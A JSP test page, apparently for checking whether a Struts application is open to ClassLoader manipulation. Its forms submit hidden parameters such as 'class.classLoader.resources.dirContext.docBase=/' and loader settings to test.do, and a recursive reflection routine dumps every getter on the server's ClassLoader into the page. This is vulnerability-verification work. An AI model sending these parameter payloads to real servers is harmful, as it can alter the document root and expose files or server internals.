<%@page import="java.io.IOException"%>
<%@page import="jp.co.ksi.incubator.MethodComparator"%>
<%@page import="java.util.Arrays"%>
<%@page import="jp.co.ksi.testruts.ReflectTest"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="java.io.PrintWriter"%>
<%@page import="org.apache.commons.beanutils.BeanUtils"%>
<%@page import="org.apache.struts.action.DynaActionForm"%>
<%@page import="java.util.Properties"%>
<%@page import="javax.naming.directory.DirContext"%>
<%@page import="org.apache.struts.config.ModuleConfig"%>
<%@page import="org.apache.struts.Globals"%>
<%@page import="java.util.Enumeration"%>
<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8" %>
<%@ page autoFlush="true"  isErrorPage="true" %>
<%@ taglib uri="ksi.tld" prefix="ksi" %>
<%@ taglib uri="struts-bean.tld" prefix="bean" %>
<%@ taglib uri="struts-logic.tld" prefix="logic" %>
<%@ taglib uri="struts-html.tld" prefix="html" %>
<html>
<head>
</head>
<body>
<%=application.getServerInfo() %>
<form action="test.do" method="get">
<input type="hidden" name="name" value="なまえ">
<input type="hidden" name="test" value="テスト">
<input type="hidden" name="class.classLoader.resources.dirContext.docBase" value="/">
<input type="hidden" name="class.classLoader.parent.resources.dirContext.docBase" value="/">
<%--
<input type="hidden" name="class.classLoader.codeSourcePermissions" value="aaaaa">
 --%>
<input type="hidden" name="class.classLoader.delegationMode" value="true">
<input type="hidden" name="class.classLoader.defaultAssertionStatus" value="true">
<input type="hidden" name="class.classLoader.JIT_StubClassPlugin" value="null">
<input type="hidden" name="class.classLoader.name" value="KacDebug">
<input type="submit" value="struts脆弱性検証(was7)">
</form>
<form action="test.do" method="post"">
<input type="hidden" name="class.classLoader.delegationMode" value="false">
<input type="hidden" name="class.classLoader.parent.delegationMode" value="false">
<input type="hidden" name="class.classLoader.defaultAssertionStatus" value="false">
<input type="hidden" name="class.classLoader.parent.defaultAssertionStatus" value="false">
<input type="hidden" name="multipartRequestHandler.servlet.internal.escape" value="false">
<input type="hidden" name="multipartRequestHandler.servlet.servletContext.contextPath" value="/">
<input type="hidden" name="servletWrapper.servletFor" value="/">
<input type="hidden" name="name" value="なまえ">
<input type="hidden" name="test" value="テスト">
<input type="submit" value="struts脆弱性検証(tomcat6)">
</form>
<form action="test.do" method="post" enctype="multipart/form-data">
<input type="file" name="file"/>
<input type="hidden" name="class.classLoader.resources.dirContext.docBase" value="/">
<input type="hidden" name="name" value="なまえ">
<input type="hidden" name="test" value="テスト">
<input type="submit">
</form>
<form action="testUpload.do" method="post" enctype="multipart/form-data">
<input type="file" name="file"/>
<input type="hidden" name="class.classLoader.resources.dirContext.docBase" value="/">
<input type="hidden" name="name" value="なまえ">
<input type="hidden" name="test" value="テスト">
<input type="submit">
</form>
<form action="check.jsp" method="get">
<input type="hidden" name="name" value="なまえ">
<input type="hidden" name="test" value="テスト">
<input type="submit">
</form>
<hr/>
<%! void reflect( JspWriter out,  Object obj, int nest ) throws IOException
{
	out.println( "<!-- "+ nest +" -->" );
	if( nest >= 17 )	return;
	
	Class	cls= obj.getClass();
	out.println( "<li>"+ cls.getName() +"</li><ul>" );
	Method[]	methods= cls.getMethods();
	Arrays.sort( methods, new MethodComparator() );
	for( int i= 0; i < methods.length; i++ )
	{
		out.println( "<li>"+ ReflectTest.getMethodShortString( methods[i] ) +"</li>" );
		if( methods[i].getName().matches( "getClass" ) )
		{
			continue;
		}
		if( methods[i].getName().matches( "get.*" ) )
		{//	getメソッド
			if( methods[i].getParameterTypes().length == 0 )
			{//	パラメータなし
				try
				{
					Object	result= methods[i].invoke( obj, (Object[])null );
					out.println( " [invoke] "+ result );
					if( ( result != null ) && !obj.equals( result ) )
					{
						reflect( out, result, ++nest );
					}
				}
				catch( Exception e )
				{
					out.println( e.toString() );
				}
			}
		}
	}
	out.println( "</ul>" );
}
%>
<%
reflect( out, getClass().getClassLoader(), 0 );
%>
</body>
</html>